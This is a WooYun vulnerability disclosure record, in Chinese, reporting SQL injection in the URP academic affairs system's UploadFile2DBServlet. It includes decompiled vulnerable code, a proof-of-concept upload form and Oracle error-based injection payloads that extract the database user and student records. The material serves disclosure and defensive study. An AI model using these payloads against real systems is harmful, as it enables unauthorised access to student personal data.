{"id": 30727, "wybug_id": "wooyun-2015-0115889", "wybug_title": "URP教务系统某处SQL注入", "wybug_corp": "北京清元优软科技有限公司", "wybug_author": "Th1nk", "wybug_date": "2015-05-25 15:09", "wybug_open_date": "2015-08-28 15:10", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "注入", "报错注入", "教务系统漏洞"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-25：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-30：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-24：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-28：\t细节向公众公开  简要描述： URP教务系统某处SQL注入，可脱裤 详细说明：  刚学j2ee，听过urp给钱多，我来试试。看看servlet呗com/runqian/report/input/UploadFile2DBServlet反编译class得到java源码UploadFile2DBServlet.java\npublic void service(HttpServletRequest request, HttpServletResponse response)        throws ServletException    {        /*省略了一些代码*/        upload = new Upload(getServletConfig(), request, response);        String update = upload.getParameter(\"update\");        data = new SegmentSet(upload.getParameter(\"data\"), true, ';');        originData = new SegmentSet(upload.getParameter(\"originData\"), true, ';');        UpdateProp up = new UpdateProp(update);\n第76行，从用户处取得了update参数。然后第78行将update放入UpdateProp，创建一个新对象up，我们来看看UpdateProp是个什么类？来看看他的析构函数\npublic class UpdateProp{    public UpdateProp(String prop)    {        _$22111 = new ArrayList();        if(prop != null && prop.trim().length() > 0)        {            for(ArgumentTokenizer at = new ArgumentTokenizer(prop, '\\0'); at.hasMoreTokens();)            {                String update = at.nextToken();                if(update != null && update.trim().length() != 0)                {                    SegmentSet segs = new SegmentSet(update, true, ';', true);                    _$22111.add(segs);                }            }        }    }\n其实就是将update传入的参数先用\\0拆分，然后用;拆分，放入数组_$22111中然后返回这个数组。然后我们继续看80-92行\ntbl = up.getTableName(0);        key = _$24713(up.getKeyCol(0));        keyValue = _$24713(up.getKeyValue(0));        if(key.size() == 0)            throw new Exception(up.toString() + \"\\u4E2D\\u6CA1\\u6709\\u6307\\u5B9A\\u5173\\u952E\\u5B57\\u6BB5! \");        if(key.size() != keyValue.size())            throw new Exception(up.getKeyCol(0) + \"\\u4E0E\" + up.getKeyValue(0) + \"\\u4E2A\\u6570\\u4E0D\\u7B49\\uFF01\");        updateCol = _$24713(up.getUpdateCol(0));        if(updateCol.size() == 0)            throw new Exception(up.toString() + \"\\u4E2D\\u6CA1\\u6709\\u6307\\u5B9A\\u53EF\\u66F4\\u65B0\\u5B57\\u6BB5! \");        updateValue = _$24713(up.getUpdateValue(0));        if(updateCol.size() != updateValue.size())            throw new Exception(up.getUpdateCol(0) + \"\\u4E0E\" + up.getUpdateValue(0) + \"\\u4E2A\\u6570\\u4E0D\\u7B49\\uFF01\");\n主要就是对刚才那个数组的的各个键进行取值，比较。如果不符合要求就退出去。然后来到106-132行\nString sql = \"select count(*) from \" + tbl + \" where \";        String where = \"\";        for(int k = 0; k < key.size(); k++)        {            String colName = (String)key.get(k);            String colValue = _$33905(originData, ((String)keyValue.get(k)).toUpperCase());            if(colValue == null || colValue.trim().length() == 0)            {                isInsert = true;                break;            }            where = where + colName + \" = \" + DataTypes.getDBConst(dbType, colValue, keyTypes[k]);            if(k < key.size() - 1)                where = where + \" and \";        }        stmt = con.createStatement();        if(!isInsert)        {            sql = sql + where;            if(sqlcode)                sql = new String(sql.getBytes(\"GBK\"), dbEncode);            ResultSet rs = stmt.executeQuery(sql);            rs.next();            if(rs.getInt(1) == 0)                isInsert = true;        }\n就是把刚才得到的各个值，进行取值，然后拼接，拼接成sql语句，最终放入stmt.executeQuery(sql);执行。这其中并没有任何的过滤，于是造成sql注入。   漏洞证明：  构造表单\n<html>\t<form action=\"http://xxx.edu.cn/servlet/com.runqian.report.input.UploadFile2DBServlet\" method=\"post\"enctype=\"multipart/form-data\"><label for=\"file\">Filename:</label><input type=\"file\" name=\"file\" id=\"file\" /> cachedId:<input type=\"text\" name=\"update\" value=\"tbl=dual;keyValue=2;keyCol=1;updateValue=1;updateCol=1\">srcType:<input type=\"text\" name=\"xh\" value=\"test\"><input type=\"text\" name=\"processor\" value=\"com.runqian.report.input.AbstractProcessor\"><input type=\"text\" name=\"backAndRefresh\" value=\"test\"><input type=\"text\" name=\"webTableName\" value=\"test11\"><input type=\"text\" name=\"importTo\" value=\"text\"><input type=\"text\" name=\"params\" value=\"params\"><br /><input type=\"submit\" name=\"submit\" value=\"Submit\" /></form></html>\n随便上传一个文件，上传时抓包update填tbl=dual;keyValue=2;keyCol=1;updateValue=1;updateCol=1。结果如图\n\n此时是因为keyCol=1,1这个列索引不存在此处直接在tbl处注入，把后面的东西注释掉就好了因为开启了oracle报错。那就简单了。报错注入下以爆数据库名为例update内容为\ntbl=dual/**/where/**/1=to_char(dbms_xmlgen.getxml('select \"'||(select user from sys.dual)||'\" from sys.dual'))--;keyValue=1;keyCol=1;updateValue=1;updateCol=1;\n\n\n然后注入出一条数据为例udpate内容为\ntbl=dual/**/where/**/1=to_char(dbms_xmlgen.getxml('select \"'||(select xh||'#'||xm||'#'||xb from xs_xjb where rownum=1)||'\" from sys.dual'))--;keyValue=1;keyCol=1;updateValue=1;updateCol=1;\n\n\n   修复方案：  过滤过滤   版权声明：转载请注明来源 Th1nk@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-08-28 15:10 厂商回复：  漏洞Rank：4  (WooYun评价) 最新状态： 2015-08-28：系统不需要调用此文件进行业务处理，屏蔽此文件  ", "replys": "漏洞评价：\n评论\n     2015-05-25 16:28 |    \t\t不能忍 \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:16        | 不要关注我，给我钱就好。)\t\t \n  你关注的大牛 Th1nk 发表了漏洞 URP教务系统某处SQL注入    \n     2015-05-25 19:28 |    \t\t命运 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 我是来乌云秀智商下限的~~)\t\t \n  然而不能GETSHELL有个鸟用...    \n     2015-05-25 20:28 |    \t\t不能忍 \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:16        | 不要关注我，给我钱就好。)\t\t \n  @命运 这好像是通用型的bug    \n     2015-05-28 21:47 |    \t\t命运 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 我是来乌云秀智商下限的~~)\t\t \n  @不能忍 然而并没有什么卵用 还是getshell比较爽    \n     2015-08-29 08:48 |    \t\t北京清元优软科技有限公司(乌云厂商)\t\t \n  此漏洞已经修复，感谢您的提交    \n     2015-08-29 18:34 |    \t\tHackPanda \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:15        | Talk is cheap,show me the shell.)\t\t \n  @北京清元优软科技有限公司 开发都快走完了吧…    \n     2015-09-02 19:16 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  原来这也可以作为忽略的借口。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}